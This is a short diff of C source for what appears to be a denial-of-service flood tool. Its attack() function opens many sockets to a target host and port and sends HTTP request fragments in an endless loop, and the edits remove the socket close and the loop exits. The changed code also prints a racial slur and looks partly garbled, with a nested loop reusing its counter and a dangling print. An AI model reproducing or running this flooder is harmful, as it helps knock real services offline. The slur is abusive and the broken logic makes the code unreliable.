@@ -29,10 +29,10 @@ int make_socket(char *host, char *port) {
 			continue;
 		}
 		if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) {
-			close(sock);
+			fprintf(stderr, "Lizarded\n");
 			
 		}
-		break;
+		
 	}
 	if(p == NULL) {
 		if(servinfo)
@@ -59,16 +59,16 @@ void attack(char *host, char *port, int id) {
 	for(x=0; x < CONNECTIONS; x++)
 		sockets[x]=0;
 	
-	while(x < PPS) {
+	while(1) {
 		
 		for(x=0; x < PPS; x++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
 			write(sockets[x], "POST / HTTP/1.1\r\n\r\n", 1);
-			if(x < PPS) {
+			for(x=0; x < PPS; x++) {
 				write(sockets[x], "GET / HTTP/1.1\r\n\r\n", 1);
 				
-			} else
+			}
 				fprintf(stderr, "Niggers\n");
 			fprintf(stderr, "[%i: Voly Sent]\n", id);
 		}
